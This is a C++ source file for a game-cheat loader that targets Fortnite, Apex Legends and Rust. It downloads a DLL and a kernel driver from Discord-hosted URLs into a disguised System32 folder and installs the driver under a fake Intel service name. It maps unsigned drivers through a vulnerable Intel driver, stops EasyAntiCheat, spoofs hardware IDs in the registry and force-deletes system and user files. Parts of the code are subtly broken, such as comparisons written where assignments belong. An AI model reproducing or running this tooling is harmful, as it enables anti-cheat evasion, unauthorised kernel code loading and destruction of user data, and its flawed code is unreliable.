#include <iostream>
#include <future>
#include "nuklear/nuklear_d3d11.h"
#pragma comment(lib, "Winmm.lib")
#include <Windows.h>
#include <winternl.h>
#include <assert.h>
#include "xor.h"
#include "hwid.h"
#include "md5wrapper.h"
#include "crypto.h"
#include "auth.h"
#include "lw_http.hpp"
#include <tchar.h>
#include "kdmapper.hpp"
#include <ShlObj_core.h>
#include <AccCtrl.h>
#include <AclAPI.h>
#include <shellapi.h>
#include "stdafx.h"
#include "kdmapper2.hpp"
#include "EAC_Driver.hpp"
#include "MemEx.hpp"
#include "CMap.hpp"
#pragma comment(lib, "version")

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")
std::string folderpath = "C:\\Windows\\System32\\$WindowsBoot";
std::string dllpath = "C:\\Windows\\System32\\$WindowsBoot\\$WindowsBootFix.dll";
std::string dllpath2 = "C:\\Windows\\System32\\$WindowsBoot\\$WindowsBoot.dll";
std::string driverpath = "C:\\Windows\\System32\\$WindowsBoot\\$WindowsBoot.sys";
std::string dllurl = "https://cdn.discordapp.com/attachments/687927369889218834/701834240869925015/WindowsBootFix.dll";
std::string dllurl2 = "https://cdn.discordapp.com/attachments/687927369889218834/701834260088356965/WindowsBoot";
std::string driverurl = "https://cdn.discordapp.com/attachments/687927369889218834/701834137517948968/driver.sys";
typedef NTSTATUS(NTAPI* lpNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, LPVOID);
typedef NTSTATUS(NTAPI* lpNtQueryInformationThread)(HANDLE, LONG, PVOID, ULONG, PULONG);
extern c_crypto crypto;
typedef NTSTATUS(WINAPI* NTQK)(HANDLE KeyHandle, DWORD KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
NTQK NtQueryKey;
HWND FortniteHWND = NULL;

MemEx mex;

LPWSTR GetKeyPath(HKEY key);
BOOL GetKeyValue(HKEY key, LPCWSTR value, LPBYTE buffer, DWORD* size);
VOID OutSpoofUnique(LPWSTR buffer);
VOID KeySpoofOutGUID(HKEY key, LPCWSTR value, LPWSTR buffer, DWORD size);
VOID KeySpoofUnique(HKEY key, LPCWSTR value);
VOID SpoofUnique(HKEY key, LPCWSTR subkey, LPCWSTR value);
VOID SpoofUniques(HKEY key, LPCWSTR subkey, LPCWSTR value);
//VOID SpoofQWORD(HKEY key, LPCWSTR subkey, LPCWSTR value);
VOID SpoofDWORD(HKEY key, LPCWSTR subkey, LPCWSTR value);
VOID SpoofBinary(HKEY key, LPCWSTR subkey, LPCWSTR value);
VOID RenameSubkey(HKEY key, LPCWSTR subkey, LPCWSTR name);
//VOID DeleteValue(HKEY key, LPCWSTR subkey, LPCWSTR value);
//VOID DeleteKey(HKEY key, LPCWSTR subkey);
BOOL AdjustCurrentPrivilege(LPCWSTR privilege);
//VOID ForceDeleteFile(LPWSTR path);
VOID RecursiveDelete(LPWSTR dir, LPWSTR match);

#define ForEachFile(dir, callback) { \
	WIN32_FIND_DATA fd = { 0 }; \
	HANDLE f = FindFirstFile(dir, &fd); \
	do { \
		if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")) { \
			LPCSTR file = fd.cFileName; \
			callback; \
		} \
	} while (FindNextFile(f, &fd)); \
	FindClose(f); \
}

#define OpenThen(hkey_key, lpcwstr_subkey, callback) { \
	HKEY _k = 0; \
	if (ERROR_SUCCESS != RegOpenKeyEx(hkey_key, lpcwstr_subkey, 0, KEY_ALL_ACCESS, &_k)) { \
		printf("  Failed to open key: %ws\\%ws\n\n", GetKeyPath(hkey_key), lpcwstr_subkey); \
	} else { \
		HKEY key = _k; \
		callback; \
		RegCloseKey(key); \
	} \
}

namespace loader {

    uint64_t window_width = 260;
    uint64_t window_height = 250;

    bool login = false;

    bool login2 = false;

    bool window_update = false;

    char token[256];

    std::string pack_id = "1";
    static IDXGISwapChain* swap_chain;
    static ID3D11Device* device;
    static ID3D11DeviceContext* context;
    static ID3D11RenderTargetView* rt_view;

}

#define WINDOW_WIDTH 250
#define WINDOW_HEIGHT 250

VOID SpoofQWORD(HKEY key, LPCSTR subkey, LPCSTR value)
{
    OpenThen(key, subkey, {
    LARGE_INTEGER data = { 0 };
    data.LowPart = rand();
    data.HighPart = rand();
    if (ERROR_SUCCESS == RegSetValueEx(key, value, 0, REG_QWORD, (PBYTE)&data, sizeof(data))) {
        printf(" %ws\\%ws\n\n", GetKeyPath(key), value, 192, 196);
    }
    else
    {
    printf("Failed to write: %ws\\%ws\n\n", GetKeyPath(key), value);
    }
        });
}

VOID DeleteValue(HKEY key, LPCSTR subkey, LPCSTR value) {
    DWORD s = SHDeleteValue(key, subkey, value);
    if (ERROR_FILE_NOT_FOUND == s) {
        return;
    }
    else if (ERROR_SUCCESS == s) {
        printf("%ws\\%ws\\%ws Deleted\n\n", GetKeyPath(key), subkey, value, 192, 196);
    }
    else {
        printf("Failed to Delete value: %ws\\%ws\\%ws\n\n", GetKeyPath(key), subkey, value);
    }
}

LPWSTR GetKeyPath(HKEY key) {
    static WCHAR buffer[MAX_PATH] = { 0 };
    DWORD size = sizeof(buffer);
    memset(buffer, 0, sizeof(buffer));
    NtQueryKey(key, 3, buffer, size, &size);
    return buffer + 3;
}

VOID DeleteKey(HKEY key, LPCSTR subkey) {
    DWORD s = SHDeleteKey(key, subkey);
    if (ERROR_FILE_NOT_FOUND == s) {
        return;
    }
    else if (ERROR_SUCCESS == s) {
        printf("%ws\\%ws Deleted\n\n", GetKeyPath(key), subkey, 192, 196);
    }
    else {
        printf("Failed to delete value: %ws\\%ws\n\n", GetKeyPath(key), subkey);
    }
}

VOID ForceDeleteFile(LPSTR path)
{
    if (!PathFileExists(path)) {
        return;
    }

    PSID all = 0, admin = 0;
    SID_IDENTIFIER_AUTHORITY world = SECURITY_WORLD_SID_AUTHORITY;
    if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &all)) {
        printf("Failed to initialize all SID for %ws: %d\n\n", path, GetLastError());
        return;
    }

    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin)) {
        printf("Failed to initialize admin SID for %ws: %d\n\n", path, GetLastError());
        FreeSid(all);
        return;
    }

    EXPLICIT_ACCESS access[2] = { 0 };
    access[0].grfAccessPermissions == GENERIC_ALL;
    access[0].grfAccessMode == SET_ACCESS;
    access[0].grfInheritance == NO_INHERITANCE;
    access[0].Trustee.TrusteeForm == TRUSTEE_IS_SID;
    access[0].Trustee.TrusteeType == TRUSTEE_IS_GROUP;
    access[0].Trustee.ptstrName == all;
    access[1].grfAccessPermissions == GENERIC_ALL;
    access[1].grfAccessMode == SET_ACCESS;
    access[1].grfInheritance == NO_INHERITANCE;
    access[1].Trustee.TrusteeForm == TRUSTEE_IS_SID;
    access[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    access[1].Trustee.ptstrName == admin;

    PACL acl = { 0 };
    DWORD error = SetEntriesInAcl(2, access, 0, &acl);
    if (ERROR_SUCCESS != error) {
        printf("Failed to set ACL entries for %ws: %d\n\n", path, error);
        FreeSid(all);
        FreeSid(admin);
        return;
    }

    if (ERROR_SUCCESS != (error = SetNamedSecurityInfo((LPSTR)path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, admin, 0, 0, 0))) {
        printf("Failed to set owner security info for %ws: %d\n\n", path, error);
        FreeSid(all);
        FreeSid(admin);
        LocalFree(acl);
        return;
    }

    if (ERROR_SUCCESS != (error = SetNamedSecurityInfo((LPSTR)path, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, 0, 0, acl, 0))) {
        printf("Failed to set DACL info for %ws: %d\n\n", path, error);
        FreeSid(all);
        FreeSid(admin);
        LocalFree(acl);
        return;
    }

    SetFileAttributes(path, FILE_ATTRIBUTE_NORMAL);

    SHFILEOPSTRUCT op = { 0 };
    op.wFunc = FO_DELETE;
    path = 0;
    op.pFrom = path;
    op.pTo = "\0";
    op.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
    op.lpszProgressTitle = "";
    if (DeleteFile(path) || !SHFileOperation(&op)) {
        printf("  [+] Deleted File %ws \n\n", path, 192, 196);
    }
    else {
        printf("  [+] Failed To Delete File %ws \n\n", path, GetLastError());
    }

    FreeSid(all);
    FreeSid(admin);
    LocalFree(acl);
}

bool IsProcessRunning(const char* processName)
{
    bool exists = false;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry))
        while (Process32Next(snapshot, &entry)) {


            if (!strcmp(entry.szExeFile, processName))
                exists = true;
        }

    CloseHandle(snapshot);
    return exists;
}

void watch()
{
    STARTUPINFO si = { };
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    PROCESS_INFORMATION pi = { };

    TCHAR szCmdLine[] = _T("cmd.exe /C \"net stop EasyAntiCheat\"");

    if (!CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {

    }
    MessageBoxA(0, "SUCCESS", "FINISHED", MB_ICONEXCLAMATION);
}


void psteapex()
{
    if (false)
    {
        Sleep(10000);
    }
    else
    {

        if (true)
        {
            system("CLS");

            if (true)
            {
                if (CreateDirectory(folderpath.c_str(), NULL) ||
                    ERROR_ALREADY_EXISTS == GetLastError())
                {
                    HRESULT hr = URLDownloadToFile(
                        NULL,
                        dllurl.c_str(),
                        dllpath.c_str(),
                        0,
                        NULL);
                    if (!SUCCEEDED(hr))
                    {

                    }
                    else
                    {
                        if (CreateDirectory(folderpath.c_str(), NULL) ||
                            ERROR_ALREADY_EXISTS == GetLastError())
                        {
                            HRESULT hr = URLDownloadToFile(
                                NULL,
                                driverurl.c_str(),
                                driverpath.c_str(),
                                0,
                                NULL);
                            if (!SUCCEEDED(hr))
                            {
                                std::cout << "[success]" << std::endl << "0x" << std::hex << hr << std::endl;
                            }
                            else
                            {
                                std::cout << "[restart]" << std::endl << "0x" << std::hex << hr << std::endl;

                                if (CreateDirectory(folderpath.c_str(), NULL) ||
                                    ERROR_ALREADY_EXISTS == GetLastError())
                                {
                                    HRESULT hr = URLDownloadToFile(
                                        NULL,
                                        dllurl2.c_str(),
                                        dllpath2.c_str(),
                                        0,
                                        NULL);
                                    if (!SUCCEEDED(hr))
                                    {
                                        std::cout << "Driver already running! - SAFE" << std::endl;
                                    }
                                    else
                                    {
                                        std::cout << "loading driver  - WAIT" << std::endl;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (pass::install::InstallService("intel213", "13423 Processor Driver", driverpath.c_str()) == 0) //https://i.gyazo.com/fd624705e5f8759abdb202fc1cc6ca65.png
            {
                if (pass::Driver::OpenDriver() == true)
                {
                    if (pass::Driver::ProtectProcess(GetCurrentProcessId()) == true)


                        std::map<std::uint32_t, std::uint8_t> UsedProcessIds;
                    bool DidWeInject = false;

                    //Sleep(250);

                    mex.Open("r5apex.exe");
                    Sleep(3000);
                    Sleep(1000);
                    system("cls");
                    Sleep(1000);
                    watch();
                    Sleep(2500);
                    printf("exiting...\n");
                    Sleep(5000);
                    exit(0);
                    DidWeInject = true;



                    /*
                        pass::Driver::CloseDriver();
                        pass::install::UninstallService("Amdkfca");  */

                }

            }

        }
        else
        {
        }
    }
}

void pstefn()
{

    if (false)
    {
        Sleep(10000);
    }
    else
    {

        if (true)
        {
            system("CLS");

            if (true)
            {
                if (CreateDirectory(folderpath.c_str(), NULL) ||
                    ERROR_ALREADY_EXISTS == GetLastError())
                {
                    HRESULT hr = URLDownloadToFile(
                        NULL,
                        dllurl.c_str(),
                        dllpath.c_str(),
                        0,
                        NULL);
                    if (!SUCCEEDED(hr))
                    {

                    }
                    else
                    {
                        if (CreateDirectory(folderpath.c_str(), NULL) ||
                            ERROR_ALREADY_EXISTS == GetLastError())
                        {
                            HRESULT hr = URLDownloadToFile(
                                NULL,
                                driverurl.c_str(),
                                driverpath.c_str(),
                                0,
                                NULL);
                            if (!SUCCEEDED(hr))
                            {
                                std::cout << "[success]" << std::endl << "0x" << std::hex << hr << std::endl;
                            }
                            else
                            {
                                std::cout << "[restart]" << std::endl << "0x" << std::hex << hr << std::endl;

                                if (CreateDirectory(folderpath.c_str(), NULL) ||
                                    ERROR_ALREADY_EXISTS == GetLastError())
                                {
                                    HRESULT hr = URLDownloadToFile(
                                        NULL,
                                        dllurl2.c_str(),
                                        dllpath2.c_str(),
                                        0,
                                        NULL);
                                    if (!SUCCEEDED(hr))
                                    {
                                        std::cout << "Driver already running! - SAFE" << std::endl;
                                    }
                                    else
                                    {
                                        std::cout << "loading driver  - WAIT" << std::endl;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (pass::install::InstallService("intel213", "13423 Processor Driver", driverpath.c_str()) == 0) //https://i.gyazo.com/fd624705e5f8759abdb202fc1cc6ca65.png
            {
                if (pass::Driver::OpenDriver() == true)
                {
                    if (pass::Driver::ProtectProcess(GetCurrentProcessId()) == true)

                        std::map<std::uint32_t, std::uint8_t> UsedProcessIds;
                    bool DidWeInject = false;

                    mex.Open("rustclient.exe"); //game client name
                    Sleep(3000);
                    //watch();
                    Sleep(1000);
                    system("cls");
                    Sleep(1000);

                    const int result = MessageBoxA(0, "Disable EAC?", "dropout1337", MB_YESNO);

                    switch (result)
                    {
                    case IDYES:
                        Sleep(1000);
                        watch();
                        break;
                    case IDNO:
                        break;
                        exit(0);
                    }

                    //  injectfn();
                    //  Sleep(2500);
                   //   printf("exiting...\n");
                    //  Sleep(5000);
                     // exit(0);
                      //injectFN();
                    DidWeInject = true;



                    /*
                        Bypass::Driver::CloseDriver();
                        Bypass::Installer::UninstallService("Amdkfca");  */

                }

            }

        }
        else
        {
        }
    }
}

VOID SpoofBinary1(HKEY key, LPCSTR subkey, LPCSTR value)
{
    OpenThen(key, subkey, {
        DWORD size = 0;
        if (ERROR_SUCCESS != RegQueryValueEx(key, value, 0, 0, 0, &size)) {
            RegCloseKey(key);
            return;
        }

        BYTE* buffer = (BYTE*)malloc(size);
        if (!buffer) {
            RegCloseKey(key);
            return;
        }

        for (DWORD i = 0; i < size; ++i) {
            buffer[i] = (BYTE)(rand() % 0x100);
        }

        RegSetValueEx(key, value, 0, REG_BINARY, buffer, size);
        free(buffer);

        printf("%ws\\%ws\n%c%c binary of length %d\n\n", GetKeyPath(key), value, 192, 196, size);
        });
}

void loadpex()
{
    HANDLE iqvw64e_device_handle = intel_driver::Load();

    if (!iqvw64e_device_handle || iqvw64e_device_handle == INVALID_HANDLE_VALUE)
    {

    }

    if (!kdmapper::MapDriver1(iqvw64e_device_handle))
    {
        intel_driver::Unload(iqvw64e_device_handle);

    }

    intel_driver::Unload(iqvw64e_device_handle);

    Sleep(2000);
    MessageBoxA(0, "driver loaded", "run ce", MB_ICONINFORMATION);
}

void clean()
{
    MessageBoxA(0, "cleaning!", "Dropout1337", 0);
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\D3DSCache"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\CrashReportClient"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\NVIDIA Corporation\\GfeSDK"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\UnrealEngine"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\Microsoft\\Feeds"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\Microsoft\\Feeds Cache"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\FortniteGame"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\EpicGamesLauncher"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\IconCache.db"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\Microsoft\\Windows\\INetCache"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\Microsoft\\Windows\\INetCookies"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\Microsoft\\Windows\\WebCache"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%ws\\Microsoft\\XboxLive\\AuthStateCache.dat"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Windows\\System32\\restore\\MachineGuid.txt"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Users\\Public\\Libraries\\collection.dat"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\System Volume Information\\IndexerVolumeGuid"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\System Volume Information\\WPSettings.dat"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\System Volume Information\\tracking.log"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\ProgramData\\Microsoft\\Windows\\WER"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Users\\Public\\Shared Files"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Windows\\INF\\setupapi.dev.log"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Windows\\INF\\setupapi.setup.log"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\PersistentDownloadDir"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Users\\Public\\Libraries"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\MSOCache"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Recovery"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\ProgramData\\ntuser.pol"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Users\\Default\\NTUSER.DAT"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\Recovery\\ntuser.sys"));
    Sleep(1000);
    ForceDeleteFile(xorstr_("%c:\\desktop.ini"));
    MessageBoxA(0, "Tracking Files Deleted!", "Dropout", 0);
}

void spoof()
{
    system("TASKKILL /F /IM r5apex.exe >NULL 2> 1");
    system("TASKKILL /F /IM OriginClientService.exe >NULL 2> 1");
    system("TASKKILL /F /IM Origin.exe >NULL 2> 1");
    system("TASKKILL /F /IM EpicGamesLauncher.exe >NULL 2> 1");
    system("TASKKILL /F /IM FortniteClient-Win64-Shipping.exe >NULL 2> 1");

    MessageBoxA(0, "spoofing DISK", "WAIT", MB_ICONINFORMATION);

    HANDLE iqvw64e_device_handle = intel_driver::Load();

    if (!iqvw64e_device_handle || iqvw64e_device_handle == INVALID_HANDLE_VALUE)
    {

    }

    if (!kdmapper::MapDriver(iqvw64e_device_handle))
    {
        intel_driver::Unload(iqvw64e_device_handle);
    }
    intel_driver::Unload(iqvw64e_device_handle);


    Sleep(2500);

    const int result = MessageBoxA(0, "HWID Spoofed Successfully", "would you like to clean?", MB_YESNOCANCEL);

    switch (result)
    {
    case IDYES:
        Sleep(1000);
        clean();
        break;
    case IDNO:
        break;
    case IDCANCEL:
        exit(0);
    }
    Sleep(1000);
}

static void
set_swap_chain_size(int width, int height)
{
    ID3D11Texture2D* back_buffer;
    D3D11_RENDER_TARGET_VIEW_DESC desc;
    HRESULT hr;

    if (loader::rt_view)
        loader::rt_view->Release();

    loader::context->OMSetRenderTargets(0, NULL, NULL);

    hr = loader::swap_chain->ResizeBuffers(0, width, height, DXGI_FORMAT_UNKNOWN, 0);
    if (hr == DXGI_ERROR_DEVICE_REMOVED || hr == DXGI_ERROR_DEVICE_RESET || hr == DXGI_ERROR_DRIVER_INTERNAL_ERROR)
    {
        MessageBoxW(NULL, L"DXGI device is removed or reset!", L"Error", 0);
        exit(0);
    }
    assert(SUCCEEDED(hr));

    memset(&desc, 0, sizeof(desc));
    desc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    desc.ViewDimension = D3D11_RTV_DIMENSION_TEXTURE2D;

    hr = loader::swap_chain->GetBuffer(0, IID_ID3D11Texture2D, (void**)&back_buffer);
    assert(SUCCEEDED(hr));

    hr = loader::device->CreateRenderTargetView((ID3D11Resource*)back_buffer, &desc, &loader::rt_view);

    assert(SUCCEEDED(hr));

    back_buffer->Release();
}

static LRESULT CALLBACK
WindowProc(HWND wnd, UINT msg, WPARAM wparam, LPARAM lparam)
{
    switch (msg)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    case WM_SIZE:
        if (loader::swap_chain)
        {
            int width = LOWORD(lparam);
            int height = HIWORD(lparam);
            set_swap_chain_size(width, height);
            nk_d3d11_resize(loader::context, width, height);
        }
        break;
    }

    if (nk_d3d11_handle_event(wnd, msg, wparam, lparam))
        return 0;

    return DefWindowProcW(wnd, msg, wparam, lparam);
}
int main()
{

    struct nk_context* ctx;
    struct nk_colorf bg;

    WNDCLASSW wc;
    RECT rect = { 0, 0, WINDOW_WIDTH, WINDOW_HEIGHT };
    DWORD style = WS_OVERLAPPEDWINDOW;
    DWORD exstyle = WS_EX_APPWINDOW;
    HWND wnd;
    int running = 1;
    HRESULT hr;
    D3D_FEATURE_LEVEL feature_level;
    DXGI_SWAP_CHAIN_DESC swap_chain_desc;

    /* Win32 */
    memset(&wc, 0, sizeof(wc));
    wc.style = CS_DBLCLKS;
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandleW(0);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.lpszClassName = L"NuklearWindowClass";
    RegisterClassW(&wc);

    AdjustWindowRectEx(&rect, style, FALSE, exstyle);

    wnd = CreateWindowExW(exstyle, wc.lpszClassName, L"dropout1337",
        style | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT,
        rect.right - rect.left, rect.bottom - rect.top,
        NULL, NULL, wc.hInstance, NULL);


    memset(&swap_chain_desc, 0, sizeof(swap_chain_desc));
    swap_chain_desc.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    swap_chain_desc.BufferDesc.RefreshRate.Numerator = 60;
    swap_chain_desc.BufferDesc.RefreshRate.Denominator = 1;
    swap_chain_desc.SampleDesc.Count = 1;
    swap_chain_desc.SampleDesc.Quality = 0;
    swap_chain_desc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    swap_chain_desc.BufferCount = 1;
    swap_chain_desc.OutputWindow = wnd;
    swap_chain_desc.Windowed = TRUE;
    swap_chain_desc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;
    swap_chain_desc.Flags = 0;

    if (FAILED(D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE,
        NULL, 0, NULL, 0, D3D11_SDK_VERSION, &swap_chain_desc,
        &loader::swap_chain, &loader::device, &feature_level, &loader::context)))
    {
        hr = D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_WARP,
            NULL, 0, NULL, 0, D3D11_SDK_VERSION, &swap_chain_desc,
            &loader::swap_chain, &loader::device, &feature_level, &loader::context);
        assert(SUCCEEDED(hr));
    }
    set_swap_chain_size(loader::window_width, loader::window_height);
    ctx = nk_d3d11_init(loader::device, loader::window_width, loader::window_height, MAX_VERTEX_BUFFER, MAX_INDEX_BUFFER);
    {struct nk_font_atlas* atlas;
    nk_d3d11_font_stash_begin(&atlas);
    nk_d3d11_font_stash_end(); }

    /* style.c */
#ifdef INCLUDE_STYLE
    set_style(ctx, THEME_WHITE);
    /*set_style(ctx, THEME_RED);*/
    /*set_style(ctx, THEME_BLUE);*/
    /*set_style(ctx, THEME_DARK);*/
#endif

    bg.r = 0.10f, bg.g = 0.18f, bg.b = 0.24f, bg.a = 1.0f;
    while (running)
    {
        MSG msg;
        nk_input_begin(ctx);
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE))
        {
            if (msg.message == WM_QUIT)
                running = 0;
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        nk_input_end(ctx);

        if (nk_begin(ctx, "LOGIN", nk_rect(0, 0, 250, 250), NK_WINDOW_BORDER))
            set_style(ctx, THEME_BLACK);
        {

            if (!loader::login && !loader::login2)
            {
                if (!loader::window_update)
                {
                    loader::window_update = true;

                    RECT desktop;
                    const HWND hDesktop = GetDesktopWindow();
                    GetWindowRect(hDesktop, &desktop);
                    int horizontal = desktop.right;
                    int vertical = desktop.bottom;

                    MoveWindow(wnd, ((horizontal / 2) - (loader::window_width / 2)), ((vertical / 2) - (loader::window_height / 2)), loader::window_width, loader::window_height, TRUE);
                }

                nk_layout_row_dynamic(ctx, 185, 1);
                if (nk_group_begin(ctx, xorstr_("column1"), NK_WINDOW_BORDER | NK_WINDOW_NO_SCROLLBAR))
                {
                    enum { fn, apex, place };
                    static int op = place;

                    nk_layout_row_dynamic(ctx, 25, 1);


                    nk_label_colored(ctx, xorstr_("AUTH"), NK_TEXT_CENTERED, nk_color{ 209, 209, 209, 255 });



                    nk_label(ctx, xorstr_("KEY:"), NK_TEXT_CENTERED);
                    nk_flags eventPassword = nk_edit_string_zero_terminated(ctx,
                        NK_EDIT_BOX,
                        loader::token, sizeof(loader::token), nk_filter_ascii);
                    std::string key = loader::token;


                    if (nk_button_label(ctx, xorstr_("LOGIN")))
                    {

                        auto md5 = new md5wrapper();
                        crypto.key_enc = crypto.random_string(256);
                        crypto.key = crypto.random_string(32);
                        crypto.iv = crypto.random_string(16);
                        const int is_valid_user = auth::get_valid_user(loader::pack_id);

                        auth::set_license_key(loader::token, loader::pack_id);

                        if (!is_valid_user)
                        {
                            MessageBoxA(0, "invalid user", "dropout1337", 0);
                            Sleep(10000);
                            exit(0);
                        }


                        else
                        {

                            if (loader::pack_id == "1")
                            {
                                loader::login = true;
                                loader::window_width = 300;
                                loader::window_height = 465;
                            }
                        }






                    }



                    nk_group_end(ctx);

                }

            }

            if (loader::login)
            {
                if (!loader::window_update)
                {
                    loader::window_update = true;

                    RECT desktop;
                    const HWND hDesktop = GetDesktopWindow();
                    GetWindowRect(hDesktop, &desktop);
                    int horizontal = desktop.right;
                    int vertical = desktop.bottom;

                    MoveWindow(wnd, ((horizontal / 2) - (loader::window_width / 2)), ((vertical / 2) - (loader::window_height / 2)), loader::window_width, loader::window_height, TRUE);
                }

                nk_layout_row_dynamic(ctx, 185, 1);
                if (nk_group_begin(ctx, xorstr_("column1"), NK_WINDOW_BORDER | NK_WINDOW_NO_SCROLLBAR))
                {
                    nk_layout_row_dynamic(ctx, 25, 1);

                    nk_label_colored(ctx, xorstr_("client"), NK_TEXT_CENTERED, nk_color{ 0, 0, 0, 255 });

                    nk_label(ctx, xorstr_("        "), NK_TEXT_CENTERED);

                    if (nk_button_label(ctx, xorstr_("EAC-BYPASS")))
                    {

                        const int result = MessageBoxA(0, "is your game started?", "dropout1337", MB_YESNO);

                        switch (result)
                        {
                        case IDYES:
                            pstefn();
                            break;
                        case IDNO:
                            break;
                            MessageBoxA(0, "start game of choice!", "dropout1337", MB_ICONEXCLAMATION);
                            Sleep(5000);
                            exit(0);
                        }


                        //pstefn();
                    }

                    if (nk_button_label(ctx, xorstr_("CE-BYPASS")))
                    {
                        const int result = MessageBoxA(0, "load driver?", "dropout1337", MB_YESNO);

                        switch (result)
                        {
                        case IDYES:
                            loadpex();
                            break;
                        case IDNO:
                            break;
                            MessageBoxA(0, "start game of choice!", "load ce-dll", MB_ICONEXCLAMATION);
                            Sleep(5000);
                            exit(0);
                        }
                    }


                }
                nk_group_end(ctx);
            }

        }
        nk_end(ctx);


        loader::context->ClearRenderTargetView(loader::rt_view, &bg.r);
        loader::context->OMSetRenderTargets(1, &loader::rt_view, NULL);
        nk_d3d11_render(loader::context, NK_ANTI_ALIASING_ON);
        hr = loader::swap_chain->Present(1, 0);
        if (hr == DXGI_ERROR_DEVICE_RESET || hr == DXGI_ERROR_DEVICE_REMOVED) {
            MessageBoxW(NULL, L"D3D11 device is lost or removed!", L"Error", 0);
            break;
        }
        else if (hr == DXGI_STATUS_OCCLUDED) {
            Sleep(10);
        }
        assert(SUCCEEDED(hr));
    }
    loader::context->ClearState();
    nk_d3d11_shutdown();
    loader::rt_view->Release();
    loader::context->Release();
    loader::device->Release();
    loader::swap_chain->Release();
    UnregisterClassW(wc.lpszClassName, wc.hInstance);
    return 0;
}


